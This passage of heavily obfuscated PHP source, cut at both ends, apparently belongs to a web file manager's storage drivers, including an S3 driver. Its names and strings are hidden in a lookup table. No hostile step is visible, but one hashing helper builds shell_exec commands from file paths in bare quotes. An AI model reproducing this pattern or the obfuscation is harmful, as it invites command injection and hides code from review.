substr($ª£›‹ü¾, $‡Şø±‰” + 1); } public function pathFather($¼¦¼­û) { $Á ÷Ã«” =& $_SERVER[Ó¡Ÿ§‚]; $¼¦¼­û = str_replace($Á ÷Ã«”[97], $Á ÷Ã«”[8], rtrim($¼¦¼­û, $Á ÷Ã«”[8])); $ÂÏ­Î†é = strrpos($¼¦¼­û, $Á ÷Ã«”[8]); if ($ÂÏ­Î†é === !1) { return $Á ÷Ã«”[12]; } return substr($¼¦¼­û, 0, $ÂÏ­Î†é + 1); } public function hashSimple($°›³Î¥„) { $äÊ¶ÔÀõ =& $_SERVER[Ó¡Ÿ§‚]; if (!$°›³Î¥„) { return md5($äÊ¶ÔÀõ[12]); } $óÒ­ô = $this->size($°›³Î¥„); $¦À¤Ì¡‚ = 200; $â·€Òõ = 50; if ($óÒ­ô <= $¦À¤Ì¡‚ * $â·€Òõ) { return $this->hashMd5($°›³Î¥„) . $óÒ­ô; } $ÎÒàâİÇ = intval($óÒ­ô / $â·€Òõ); $¦úÓ§ò® = $äÊ¶ÔÀõ[12]; for ($½ÖëĞ¨Ö = 0; $½ÖëĞ¨Ö < $â·€Òõ; $½ÖëĞ¨Ö++) { $¦úÓ§ò® .= $this->fileSubstr($°›³Î¥„, $ÎÒàâİÇ * $½ÖëĞ¨Ö, $¦À¤Ì¡‚); } $¦úÓ§ò® .= $this->fileSubstr($°›³Î¥„, $óÒ­ô - $¦À¤Ì¡‚, $¦À¤Ì¡‚); return md5($¦úÓ§ò®) . $óÒ­ô; } public static $md5Cache = array(); public function hashMd5($€Ì¯¬£) { if (!$€Ì¯¬£) { return md5($_SERVER[Ó¡Ÿ§‚][12]); } $€Ì¯¬£ = $this->iconvSystem($€Ì¯¬£); if (isset(self::$md5Cache[$€Ì¯¬£])) { return self::$md5Cache[$€Ì¯¬£]; } self::$md5Cache[$€Ì¯¬£] = $this->hashMd5Shell($€Ì¯¬£); if (!self::$md5Cache[$€Ì¯¬£]) { self::$md5Cache[$€Ì¯¬£] = @md5_file($€Ì¯¬£); } return self::$md5Cache[$€Ì¯¬£]; } private function hashMd5Shell($ç“îÌ–) { $Ş»Ñ‘• =& $_SERVER[Ó¡Ÿ§‚]; if (!$ç“îÌ–) { return md5($Ş»Ñ‘•[12]); } if (!function_exists($Ş»Ñ‘•[98])) { return !1; } $²ëûÏ‚¦ = array($Ş»Ñ‘•[99], $Ş»Ñ‘•[100]); $ùèŞ»Ÿ = Cache::get($Ş»Ñ‘•[101]); if (!$ùèŞ»Ÿ) { $Öô÷­‹˜ = BASIC_PATH . $Ş»Ñ‘•[102]; $şäº‹íœ = md5_file($Öô÷­‹˜); $ùèŞ»Ÿ = $Ş»Ñ‘•[103]; foreach ($²ëûÏ‚¦ as $¹ºşâ¨Õ) { $’ßÇÃÜ = shell_exec($¹ºşâ¨Õ . "\40\42{$Öô÷­‹˜}\42"); if ($’ßÇÃÜ && substr(trim($’ßÇÃÜ), 0, 32) == $şäº‹íœ) { $ùèŞ»Ÿ = $¹ºşâ¨Õ; break; } } Cache::set($Ş»Ñ‘•[101], $ùèŞ»Ÿ, 3600); } if ($ùèŞ»Ÿ == $Ş»Ñ‘•[103]) { return !1; } $’ßÇÃÜ = shell_exec($ùèŞ»Ÿ . "\40\42{$ç“îÌ–}\42"); $’ßÇÃÜ = str_replace($Ş»Ñ‘•[104], $Ş»Ñ‘•[12], $’ßÇÃÜ); return substr($’ßÇÃÜ, 0, 32); } public function link($ì™ÓÛñ¦) { return $ì™ÓÛñ¦; } public function fileOut($º¦êò‹ä, $¸”çƒ¸ = false, $ºÎ¨ç = false, $¨ñ–½Á€ = '') { $Ÿâ€Âü“ =& $_SERVER[Ó¡Ÿ§‚]; $this->cacheMethod(null, null); if (!$º¦êò‹ä || !$this->exist($º¦êò‹ä)) { show_json(LNG($Ÿâ€Âü“[105]), !1, $ºÎ¨ç); } $‘Ô¦£·î = $this->getType() == $Ÿâ€Âü“[106]; $ÈùŠşğÇ = $GLOBALS[$Ÿâ€Âü“[6]][$Ÿâ€Âü“[89]][$Ÿâ€Âü“[107]][$Ÿâ€Âü“[108]]; $ÍàÏ¢ï = (double) $GLOBALS[$Ÿâ€Âü“[6]][$Ÿâ€Âü“[89]][$Ÿâ€Âü“[107]][$Ÿâ€Âü“[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ºü¯¥ÔÇ = $this->infoFull($º¦êò‹ä); $†ãÑ†ãÈ = $ºü¯¥ÔÇ[$Ÿâ€Âü“[76]]; $·ºĞ•Èó = gmdate($Ÿâ€Âü“[110], $ºü¯¥ÔÇ[$Ÿâ€Âü“[85]]); $´”ƒ¡À’ = $ºÎ¨ç ? $ºÎ¨ç : $this->iconvApp($ºü¯¥ÔÇ[$Ÿâ€Âü“[32]]); $Şîø£­ = 0; $ÍÁå€¹‘ = $†ãÑ†ãÈ - 1; $¯Ç«¾ø = $this->ext($´”ƒ¡À’); if (in_array($¯Ç«¾ø, array($Ÿâ€Âü“[111], $Ÿâ€Âü“[112], $Ÿâ€Âü“[113], $Ÿâ€Âü“[114]))) { $¯Ç«¾ø = $Ÿâ€Âü“[115]; } if (in_array($¯Ç«¾ø, array($Ÿâ€Âü“[116]))) { $¯Ç«¾ø = $Ÿâ€Âü“[117]; } if (!$¨ñ–½Á€) { $¨ñ–½Á€ = md5($·ºĞ•Èó . $this->hashSimple($º¦êò‹ä)); } $¨ñ–½Á€ = $Ÿâ€Âü“[118] . $¨ñ–½Á€ . $Ÿâ€Âü“[118]; $¿×™—ø‹ = get_file_mime($¯Ç«¾ø); $ºÓÈğâ“ = !0; $ºÓÈğâ“ = isset($_GET[$Ÿâ€Âü“[119]]) ? !1 : !0; if ($¸”çƒ¸ === !1 && !mime_support($¿×™—ø‹)) { $¿×™—ø‹ = $Ÿâ€Âü“[120]; } header($Ÿâ€Âü“[121]); header($Ÿâ€Âü“[122] . $¿×™—ø‹); $›ìÖ—Û• = rawurlencode($´”ƒ¡À’); $›ìÖ—Û• = $Ÿâ€Âü“[118] . $›ìÖ—Û• . $Ÿâ€Âü“[123] . $›ìÖ—Û•; if ($¸”çƒ¸) { header($Ÿâ€Âü“[124]); header($Ÿâ€Âü“[125] . $›ìÖ—Û•); } else { if ($ºÓÈğâ“) { header($Ÿâ€Âü“[126] . $›ìÖ—Û•); } } header($Ÿâ€Âü“[127] . gmdate($Ÿâ€Âü“[110], time() + 3600 * 24 * 30) . $Ÿâ€Âü“[128]); header($Ÿâ€Âü“[129]); header($Ÿâ€Âü“[130]); header($Ÿâ€Âü“[131]); if (isset($_SERVER[$Ÿâ€Âü“[132]]) && strtotime($_SERVER[$Ÿâ€Âü“[132]]) == $ºü¯¥ÔÇ[$Ÿâ€Âü“[85]]) { header($Ÿâ€Âü“[133], !0, 304); die; } if (isset($_SERVER[$Ÿâ€Âü“[134]]) && $_SERVER[$Ÿâ€Âü“[134]] == $¨ñ–½Á€) { header($Ÿâ€Âü“[135] . $¨ñ–½Á€, !0, 304); die; } header($Ÿâ€Âü“[135] . $¨ñ–½Á€); header($Ÿâ€Âü“[136] . $·ºĞ•Èó . $Ÿâ€Âü“[128]); header($Ÿâ€Âü“[137] . $´”ƒ¡À’); header($Ÿâ€Âü“[138]); header($Ÿâ€Âü“[139] . $†ãÑ†ãÈ); header($Ÿâ€Âü“[140]); if (!$¸”çƒ¸ && $¯Ç«¾ø == $Ÿâ€Âü“[141]) { if ($†ãÑ†ãÈ > 1024 * 1024 * 5) { die; } $ö¶œè¦ = $this->getContent($º¦êò‹ä); $ö¶œè¦ = Html::clearSVG($ö¶œè¦); header($Ÿâ€Âü“[142] . strlen($ö¶œè¦)); echo $ö¶œè¦; die; } $¼‡ğ«›³ = strtolower($_SERVER[$Ÿâ€Âü“[143]]); if ($‘Ô¦£·î && $¼‡ğ«›³ && $ÈùŠşğÇ) { if (strstr($¼‡ğ«›³, $Ÿâ€Âü“[144])) { header($Ÿâ€Âü“[145] . $º¦êò‹ä); } else { if (strstr($¼‡ğ«›³, $Ÿâ€Âü“[146])) { header($Ÿâ€Âü“[147] . $º¦êò‹ä); } else { if (strstr($¼‡ğ«›³, $Ÿâ€Âü“[148])) { header($Ÿâ€Âü“[149] . $º¦êò‹ä); } } } if ($ÍàÏ¢ï) { header($Ÿâ€Âü“[150] . $ÍàÏ¢ï); } return; } if (isset($_SERVER[$Ÿâ€Âü“[151]])) { if (preg_match($Ÿâ€Âü“[152], $_SERVER[$Ÿâ€Âü“[151]], $Ó¦´è‡è)) { $Şîø£­ = intval($Ó¦´è‡è[1]); $Şîø£­ = $Şîø£­ <= 0 ? 0 : ($Şîø£­ >= $ÍÁå€¹‘ ? $ÍÁå€¹‘ : $Şîø£­); if (!empty($Ó¦´è‡è[2])) { $”‚åò£à = intval($Ó¦´è‡è[2]); $ÍÁå€¹‘ = $”‚åò£à < $Şîø£­ ? $Şîø£­ : ($”‚åò£à >= $ÍÁå€¹‘ ? $ÍÁå€¹‘ : $”‚åò£à); } } header($Ÿâ€Âü“[153]); header("\x43\157\x6e\164\145\x6e\x74\55\x52\x61\x6e\x67\x65\x3a\x20\x62\x79\x74\145\x73\x20{$Şîø£­}\55{$ÍÁå€¹‘}\57" . $†ãÑ†ãÈ); } else { header($Ÿâ€Âü“[154]); } header($Ÿâ€Âü“[155]); $Ëáèò¸Ÿ = !0; if ($_SERVER[$Ÿâ€Âü“[156]] == $Ÿâ€Âü“[157] && $†ãÑ†ãÈ > 1204 * 1024 * 1024 * 2) { $Ëáèò¸Ÿ = !1; } if ($Ëáèò¸Ÿ) { header($Ÿâ€Âü“[158] . ($ÍÁå€¹‘ - $Şîø£­ + 1)); } if ($_SERVER[$Ÿâ€Âü“[159]] == $Ÿâ€Âü“[160]) { return; } $Ü’ç²Ø¨ = 1024 * 100; $ÌçîØíÜ = 0; if ($ÍàÏ¢ï) { $ÌçîØíÜ = intval(1000 * 1000 * ($Ü’ç²Ø¨ / $ÍàÏ¢ï)); } while ($Şîø£­ <= $ÍÁå€¹‘) { $½–¶ÃÌª = timeFloat(); check_abort(); $–‡Ä¦à = $ÍÁå€¹‘ - $Şîø£­ + 1; if ($–‡Ä¦à <= $Ü’ç²Ø¨) { $Ü’ç²Ø¨ = $–‡Ä¦à; } echo $this->fileSubstr($º¦êò‹ä, $Şîø£­, $Ü’ç²Ø¨); $Şîø£­ += $Ü’ç²Ø¨; if ($Ü’ç²Ø¨ == $–‡Ä¦à) { $Şîø£­ = $ÍÁå€¹‘ + 1; } if ($ÌçîØíÜ) { $Å àşë = intval(1000 * 1000 * (timeFloat() - $½–¶ÃÌª)); $Ï´Œ¦€Å = $ÌçîØíÜ - $Å àşë; if ($Ï´Œ¦€Å > 5) { usleep($Ï´Œ¦€Å); } } } } public function fileOutServer($üÊæ½á£, $éö´ÀÃ£ = false, $Éû¥»“© = false, $Şñµ•ã = '') { $this->fileOut($üÊæ½á£, $éö´ÀÃ£, $Éû¥»“©, $Şñµ•ã); } public function fileOutLink($Ïé©æı‡) { header($_SERVER[Ó¡Ÿ§‚][161] . $Ïé©æı‡); die; } public function cacheMethod($Ò©êÆô­, $Ø“¿çªç, $Ùø‰şª = null) { $…Ç¡Î¤ò =& $_SERVER[Ó¡Ÿ§‚]; static $ˆ¢Øêİ¬ = array(); $áĞĞûÌ£ = $Ø“¿çªç ? ltrim($this->getPathOuter($Ø“¿çªç), $…Ç¡Î¤ò[8]) : $…Ç¡Î¤ò[12]; $şÛã’» = $…Ç¡Î¤ò[162] . $Ò©êÆô­ . $…Ç¡Î¤ò[163] . rtrim($áĞĞûÌ£, $…Ç¡Î¤ò[8]); if (is_null($Ò©êÆô­)) { $ˆ¢Øêİ¬ = array(); return; } if (is_null($Ø“¿çªç)) { foreach ($ˆ¢Øêİ¬ as $şÛã’» => $»ÇŸñ¸˜) { if (!strstr($şÛã’», $…Ç¡Î¤ò[162] . $Ò©êÆô­ . $…Ç¡Î¤ò[164])) { continue; } unset($ˆ¢Øêİ¬[$şÛã’»]); } return; } if (!is_null($Ùø‰şª)) { $ˆ¢Øêİ¬[$şÛã’»] = $Ùø‰şª; return; } $ã¡¦ù¶€ = isset($ˆ¢Øêİ¬[$şÛã’»]) ? $ˆ¢Øêİ¬[$şÛã’»] : null; if (!is_null($ã¡¦ù¶€)) { return $ã¡¦ù¶€; } $ã¡¦ù¶€ = $this->{$Ò©êÆô­}($Ø“¿çªç); $ˆ¢Øêİ¬[$şÛã’»] = $ã¡¦ù¶€; return $ã¡¦ù¶€; } public function cacheMethodInfoSet($üµ´Æ¨, $¼““”, $¥®Ñª¥ƒ = false) { $„È¿©äÀ =& $_SERVER[Ó¡Ÿ§‚]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($„È¿©äÀ[165], $üµ´Æ¨, $¼““”); $this->cacheMethod($„È¿©äÀ[166], $üµ´Æ¨, $¼““” ? !1 : !0); if (is_array($¥®Ñª¥ƒ)) { $this->cacheMethod($„È¿©äÀ[167], $üµ´Æ¨, $¥®Ñª¥ƒ); } } public function fileOutImage($ÎÖËË¹œ, $ˆ¾‹ßõ¾ = 250) { $Šíå“üÆ =& $_SERVER[Ó¡Ÿ§‚]; set_timeout(); if (substr($ÎÖËË¹œ, 0, 4) == $Šíå“üÆ[148]) { $this->fileOutLink($ÎÖËË¹œ); } $ìÎÚĞ¡Ù = $this->info($ÎÖËË¹œ); $”¾æÀ¿¹ = $ìÎÚĞ¡Ù[$Šíå“üÆ[32]]; $ŸĞƒ¤ÂÛ = !1; if (isset($GLOBALS[$Šíå“üÆ[168]]) && $GLOBALS[$Šíå“üÆ[168]][$Šíå“üÆ[84]] == $ìÎÚĞ¡Ù[$Šíå“üÆ[84]]) { $œÚ˜ô¨û = $GLOBALS[$Šíå“üÆ[168]][$Šíå“üÆ[169]]; if (!$ìÎÚĞ¡Ù[$Šíå“üÆ[170]]) { $ìÎÚĞ¡Ù[$Šíå“üÆ[170]] = $GLOBALS[$Šíå“üÆ[168]]; } if (isset($œÚ˜ô¨û[$Šíå“üÆ[171]])) { if ($œÚ˜ô¨û[$Šíå“üÆ[171]] <= $ˆ¾‹ßõ¾ && $œÚ˜ô¨û[$Šíå“üÆ[172]] <= $ˆ¾‹ßõ¾) { $ŸĞƒ¤ÂÛ = !0; } } $”¾æÀ¿¹ = $ìÎÚĞ¡Ù[$Šíå“üÆ[170]][$Šíå“üÆ[32]]; } if ($ìÎÚĞ¡Ù[$Šíå“üÆ[76]] <= 1024 * 50 || $ŸĞƒ¤ÂÛ || !function_exists($Šíå“üÆ[173]) || $ìÎÚĞ¡Ù[$Šíå“üÆ[174]] == $Šíå“üÆ[175]) { return $this->fileOut($ÎÖËË¹œ, !1, $”¾æÀ¿¹); } if (isset($ìÎÚĞ¡Ù[$Šíå“üÆ[170]][$Šíå“üÆ[176]])) { $‡¨Ó¿³Ğ = $ìÎÚĞ¡Ù[$Šíå“üÆ[170]][$Šíå“üÆ[176]]; } else { if (isset($ìÎÚĞ¡Ù[$Šíå“üÆ[170]][$Šíå“üÆ[177]])) { $‡¨Ó¿³Ğ = $ìÎÚĞ¡Ù[$Šíå“üÆ[170]][$Šíå“üÆ[177]]; } } if (!$‡¨Ó¿³Ğ) { $‡¨Ó¿³Ğ = md5("{$ìÎÚĞ¡Ù[$Šíå“üÆ[32]]}\x5f{$ìÎÚĞ¡Ù[$Šíå“üÆ[84]]}\137{$ìÎÚĞ¡Ù[$Šíå“üÆ[76]]}\x5f{$ˆ¾‹ßõ¾}"); } $¼ØÑº†½ = "{$‡¨Ó¿³Ğ}\137{$ˆ¾‹ßõ¾}\x2e\160\x6e\x67"; if (!($ÇóŠ†×é = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Šíå“üÆ[178]))) { $¥š¡Áí¾ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Šíå“üÆ[179]); } else { $¥š¡Áí¾ = KodIO::make($ÇóŠ†×é); } if ($ÇóŠ†×é = IO::fileNameExist($¥š¡Áí¾, $¼ØÑº†½)) { $¢›³˜Œ¿ = KodIO::make($ÇóŠ†×é); return IO::fileOut($¢›³˜Œ¿, !1, $”¾æÀ¿¹); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¢›³˜Œ¿ = DATA_THUMB . $¼ØÑº†½; del_file($¢›³˜Œ¿); if (!@file_exists($¢›³˜Œ¿)) { $ÜÉö§ı• = TEMP_FILES; if (!is_dir($ÜÉö§ı•)) { mk_dir($ÜÉö§ı•); } $ÃšíŠ²à = $ÜÉö§ı• . $‡¨Ó¿³Ğ . $Šíå“üÆ[10] . $ìÎÚĞ¡Ù[$Šíå“üÆ[174]]; if (!@file_exists($ÃšíŠ²à)) { $ÃšíŠ²à = $this->download($ÎÖËË¹œ, $ÃšíŠ²à); } ImageThumb::createThumb($ÃšíŠ²à, $¢›³˜Œ¿, $ˆ¾‹ßõ¾, $ˆ¾‹ßõ¾ * 10); } if (!file_exists($¢›³˜Œ¿) || filesize($¢›³˜Œ¿) < 100) { return @file_exists($ÃšíŠ²à) ? IO::fileOut($ÃšíŠ²à) : $this->fileOut($ÎÖËË¹œ); } if (!($‚İÉ±¶ğ = IO::move($¢›³˜Œ¿, $¥š¡Áí¾))) { return IO::fileOut($¢›³˜Œ¿); } del_file($¢›³˜Œ¿); IO::fileOut($‚İÉ±¶ğ); } public function fileOutImageServer($°æ¦¼°, $ú¯’´Óô = 250) { $this->fileOutImage($°æ¦¼°, $ú¯’´Óô); } public function fileNameAuto($ÉÛ×†ÃÃ, $òú×‚Ø, $¬×µ³ç¯ = REPEAT_RENAME, $ö£ÑÃ¾¨ = false) { $™¾¡ØŞÇ =& $_SERVER[Ó¡Ÿ§‚]; $ñĞÍ…ëŠ = $ÉÛ×†ÃÃ === $™¾¡ØŞÇ[12] ? $òú×‚Ø : rtrim($ÉÛ×†ÃÃ, $™¾¡ØŞÇ[8]) . $™¾¡ØŞÇ[8] . $òú×‚Ø; if ($¬×µ³ç¯ == REPEAT_REPLACE || !$this->exist($ñĞÍ…ëŠ) || $ö£ÑÃ¾¨ && $¬×µ³ç¯ != REPEAT_RENAME_FOLDER) { return $òú×‚Ø; } if ($¬×µ³ç¯ == REPEAT_SKIP) { return !1; } $­æõÉñ— = $™¾¡ØŞÇ[10] . get_path_ext($òú×‚Ø); $­æõÉñ— = $­æõÉñ— == $™¾¡ØŞÇ[10] || $ö£ÑÃ¾¨ ? $™¾¡ØŞÇ[12] : $­æõÉñ—; $·¨´„Äñ = 1; $»ÊçŒÌ” = substr($òú×‚Ø, 0, strlen($òú×‚Ø) - strlen($­æõÉñ—)); $Æõİ ­– = $»ÊçŒÌ” . "\50{$·¨´„Äñ}\51{$­æõÉñ—}"; while ($this->exist(rtrim($ÉÛ×†ÃÃ, $™¾¡ØŞÇ[8]) . $™¾¡ØŞÇ[8] . $Æõİ ­–)) { $Æõİ ­– = $»ÊçŒÌ” . "\50{$·¨´„Äñ}\x29{$­æõÉñ—}"; $·¨´„Äñ++; } return $Æõİ ­–; } private function fileNameAutoList($Ö™øëÕŸ, $Ş†ÏÙ×·, $…Åßƒâ– = false) { $ËöÏ‹¬Ù =& $_SERVER[Ó¡Ÿ§‚]; $«©Ğñ’ = $this->listPath($Ö™øëÕŸ, !0); $«©Ğñ’ = array_merge($«©Ğñ’[$ËöÏ‹¬Ù[82]], $«©Ğñ’[$ËöÏ‹¬Ù[83]]); $ùŞÌÀÅÍ = array_to_keyvalue($«©Ğñ’, $ËöÏ‹¬Ù[12], $ËöÏ‹¬Ù[32]); $éÛâ¤üÛ = $ËöÏ‹¬Ù[10] . get_path_ext($Ş†ÏÙ×·); $éÛâ¤üÛ = $éÛâ¤üÛ == $ËöÏ‹¬Ù[10] || $…Åßƒâ– ? $ËöÏ‹¬Ù[12] : $éÛâ¤üÛ; $³œº˜¯ = substr($Ş†ÏÙ×·, 0, strlen($Ş†ÏÙ×·) - strlen($éÛâ¤üÛ)); $Ü™£Â¹£ = $³œº˜¯ . "\50\60\51{$éÛâ¤üÛ}"; for ($½øí¢æ = 1; $½øí¢æ <= count($ùŞÌÀÅÍ) + 1; $½øí¢æ++) { $Ü™£Â¹£ = $³œº˜¯ . "\x28{$½øí¢æ}\51{$éÛâ¤üÛ}"; if (!in_array_not_case($Ü™£Â¹£, $ùŞÌÀÅÍ)) { return $Ü™£Â¹£; } } return $Ü™£Â¹£; } public function listAllFiles($éÁ™ß–, $°À©Ìú¥) { $¹ Ò”éï =& $_SERVER[Ó¡Ÿ§‚]; if (empty($°À©Ìú¥)) { return array(); } $à¸¢Ê×¨ = array_keys($°À©Ìú¥); $˜í¹àÀ  = array(); $éÁ™ß– = trim($éÁ™ß–, $¹ Ò”éï[8]); foreach ($°À©Ìú¥ as $³Ú®Ÿİë => $Í¿¨âÀ·) { $ĞÃ¾ç = ltrim(substr(trim($³Ú®Ÿİë, $¹ Ò”éï[8]), strlen($éÁ™ß–)), $¹ Ò”éï[8]); if (substr($³Ú®Ÿİë, -1) == $¹ Ò”éï[8]) { $ĞÃ¾ç = rtrim($ĞÃ¾ç, $¹ Ò”éï[8]) . $¹ Ò”éï[8]; } $˜í¹àÀ  = array_merge($˜í¹àÀ , $this->slicePath($ĞÃ¾ç)); } $ÏŠÕ»Å« = array(); foreach (array_unique($˜í¹àÀ ) as $¬›ÀÆ–É) { $ÀªÂœ‘° = array($¹ Ò”éï[84] => $this->getPathOuter($¹ Ò”éï[8] . $éÁ™ß– . $¹ Ò”éï[8] . $¬›ÀÆ–É), $¹ Ò”éï[75] => 1, $¹ Ò”éï[76] => 0); if (substr($¬›ÀÆ–É, -1) != $¹ Ò”éï[8]) { $ÀªÂœ‘°[$¹ Ò”éï[75]] = 0; $„•‹ôæ = $this->getPath($éÁ™ß– . $¹ Ò”éï[8] . $¬›ÀÆ–É); if (isset($°À©Ìú¥[$„•‹ôæ])) { $’¥´°Ôµ = $°À©Ìú¥[$„•‹ôæ]; if (isset($’¥´°Ôµ[$¹ Ò”éï[76]])) { $ÀªÂœ‘°[$¹ Ò”éï[76]] = intval($’¥´°Ôµ[$¹ Ò”éï[76]]); } if (isset($’¥´°Ôµ[$¹ Ò”éï[180]])) { $ÀªÂœ‘°[$¹ Ò”éï[85]] = intval($’¥´°Ôµ[$¹ Ò”éï[180]]); } } } $ÏŠÕ»Å«[] = $ÀªÂœ‘°; } return $ÏŠÕ»Å«; } public function slicePath($¸ÌáÁõ) { $ğ¹„µ =& $_SERVER[Ó¡Ÿ§‚]; $ÈÂ÷Ğï— = explode($ğ¹„µ[8], trim($¸ÌáÁõ, $ğ¹„µ[8])); $êˆàåÉç = 0; do { ++$êˆàåÉç; $œ¦ô€„’[] = implode($ğ¹„µ[8], array_slice($ÈÂ÷Ğï—, 0, $êˆàåÉç)) . $ğ¹„µ[8]; } while ($êˆàåÉç < count($ÈÂ÷Ğï—)); $œ¦ô€„’[count($ÈÂ÷Ğï—) - 1] = $¸ÌáÁõ; return $œ¦ô€„’; } public function getHost() { $’âæ±ÓÄ =& $_SERVER[Ó¡Ÿ§‚]; $ıµğ¤¯Å = parse_url(trim($this->domain, $’âæ±ÓÄ[8])); $©‡îƒôõ = isset($ıµğ¤¯Å[$’âæ±ÓÄ[181]]) ? $ıµğ¤¯Å[$’âæ±ÓÄ[181]] : http_type(); $ÖšÀïË€ = isset($ıµğ¤¯Å[$’âæ±ÓÄ[182]]) ? $ıµğ¤¯Å[$’âæ±ÓÄ[182]] : $ıµğ¤¯Å[$’âæ±ÓÄ[84]]; if (isset($ıµğ¤¯Å[$’âæ±ÓÄ[183]])) { $ÖšÀïË€ .= $’âæ±ÓÄ[4] . $ıµğ¤¯Å[$’âæ±ÓÄ[183]]; } return $©‡îƒôõ . $’âæ±ÓÄ[184] . $ÖšÀïË€; } public function pathEncode($‰’Ê‰ñ) { $¨Ì¯Éú¾ =& $_SERVER[Ó¡Ÿ§‚]; return str_replace($¨Ì¯Éú¾[185], $¨Ì¯Éú¾[8], rawurlencode($‰’Ê‰ñ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ç·Ìúˆ) { set_timeout(); require_once SDK_DIR . $_SERVER[Ó¡Ÿ§‚][186]; parent::__construct(); $this->_init($ç·Ìúˆ); } public function _init($¹ÔÃêÍ) { $this->config = $¹ÔÃêÍ; foreach ($¹ÔÃêÍ as $Ê©¨ÚØ => $ò˜Ö¹šÖ) { if (isset($this->{$Ê©¨ÚØ})) { $this->{$Ê©¨ÚØ} = $ò˜Ö¹šÖ; } } $this->endpoint = $¹ÔÃêÍ[$_SERVER[Ó¡Ÿ§‚][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($½«…™ = "\x76\64") { $this->signVer = $½«…™; $this->client->setSignatureVersion($½«…™); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ş³¾Çğ“ =& $_SERVER[Ó¡Ÿ§‚]; $€Óİıà“ = $this->getBucketCors(); if (!$€Óİıà“ || !is_array($€Óİıà“)) { return !1; } if ($€Óİıà“[$ş³¾Çğ“[188]] != $ş³¾Çğ“[189] || $€Óİıà“[$ş³¾Çğ“[190]] != $ş³¾Çğ“[189]) { return !1; } $äÀ‚Üõ´ = array_map($ş³¾Çğ“[191], $€Óİıà“[$ş³¾Çğ“[192]]); if (!is_array($äÀ‚Üõ´)) { $äÀ‚Üõ´ = array(); } $ÀÊÊºÓò = array($ş³¾Çğ“[193], $ş³¾Çğ“[194], $ş³¾Çğ“[195], $ş³¾Çğ“[196], $ş³¾Çğ“[197]); $á±«ø¶ì = array_diff($ÀÊÊºÓò, $äÀ‚Üõ´); return empty($á±«ø¶ì); } public function mkfile($ë´ìòÊÎ, $‡Â×“™› = '', $„­æËüù = REPEAT_RENAME) { $Éé…ıÅ = $this->setContent($ë´ìòÊÎ, $‡Â×“™›); if ($Éé…ıÅ !== !1) { return $this->getPathOuter($ë´ìòÊÎ); } return !1; } public function mkdir($²Ÿ»¿Æ, $–„ëù—ù = REPEAT_SKIP) { $­·À»ã¬ =& $_SERVER[Ó¡Ÿ§‚]; if (empty($²Ÿ»¿Æ) && $²Ÿ»¿Æ !== $­·À»ã¬[198]) { return !1; } if ($–„ëù—ù && $this->_isFolder($²Ÿ»¿Æ)) { return $this->getPathOuter($²Ÿ»¿Æ); } $º•ğúùÜ = $this->setContent($²Ÿ»¿Æ, $­·À»ã¬[12], !0); if ($º•ğúùÜ !== !1) { return $this->getPathOuter($²Ÿ»¿Æ); } return !1; } public function copyFile($ˆàŞÔ˜´, $‘Ô×öĞƒ, $³¶¬íÂ‹ = array()) { $éåŸş‹® =& $_SERVER[Ó¡Ÿ§‚]; $Ä²—Ö¹Ğ = $this->objectMeta($ˆàŞÔ˜´); if (!$Ä²—Ö¹Ğ) { return !1; } if ($Ä²—Ö¹Ğ[$éåŸş‹®[76]] <= 1024 * 1024 * 200) { $øşâÊªé = $this->client->copyObject($this->bucket, $ˆàŞÔ˜´, $this->bucket, $‘Ô×öĞƒ, $éåŸş‹®[199], $³¶¬íÂ‹); } else { $øşâÊªé = $this->client->multiCopyObject($this->bucket, $ˆàŞÔ˜´, $this->bucket, $‘Ô×öĞƒ, $³¶¬íÂ‹); } $øşâÊªé = $øşâÊªé ? $this->getPathOuter($‘Ô×öĞƒ) : !1; return $øşâÊªé; } public function moveFile($°ğöªŸ£, $ÀØèó½Ñ) { if ($this->copyFile($°ğöªŸ£, $ÀØèó½Ñ)) { $this->delFile($°ğöªŸ£); return $this->getPathOuter($ÀØèó½Ñ); } return !1; } public function delFile($‚ŞÃéÁ) { return $this->client->deleteObject($this->bucket, $‚ŞÃéÁ); } public function delFolder($äõôè­Ë) { $Œ†İµÚÉ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->exist($äõôè­Ë)) { return !0; } $this->listItemCache = !1; $ÜÊ¸ô®ß = $this->fileList($äõôè­Ë); $this->listItemCache = !0; $´ù­…¼ = trim($äõôè­Ë, $Œ†İµÚÉ[8]) . $Œ†İµÚÉ[8]; if (!empty($äõôè­Ë) && $äõôè­Ë !== $Œ†İµÚÉ[198] && !in_array($´ù­…¼, $ÜÊ¸ô®ß[$Œ†İµÚÉ[82]])) { $ÜÊ¸ô®ß[$Œ†İµÚÉ[82]][] = $´ù­…¼; } $ó•…Şè± = $this->delByBatch($ÜÊ¸ô®ß[$Œ†İµÚÉ[83]]); if (!$ó•…Şè±) { return !1; } $ó•…Şè± = $this->delByBatch($ÜÊ¸ô®ß[$Œ†İµÚÉ[82]]); if (!$ó•…Şè±) { return !1; } return $this->delFile($´ù­…¼); } private function delByBatch($ÎÍğ¼å†) { foreach (array_chunk($ÎÍğ¼å†, 1000) as $ÁÌ¬íšÛ) { $“Ÿ—¼ŸĞ = $this->client->deleteObjects($this->bucket, $ÁÌ¬íšÛ); if (!$“Ÿ—¼ŸĞ) { return !1; } } return !0; } public function rename($‡×¡ü§, $¥›õŸúè) { return $this->renameObject($‡×¡ü§, $¥›õŸúè); } public function listPath($Æ×ôú®û, $Â—½ä¡Œ = false) { $ûÅİıİ» =& $_SERVER[Ó¡Ÿ§‚]; $¾°àë‚ê = $this->fileList($Æ×ôú®û, $ûÅİıİ»[8], !0); foreach ($¾°àë‚ê[$ûÅİıİ»[82]] as $ÅÛ‘ú¸Æ => $üòñ¶½) { 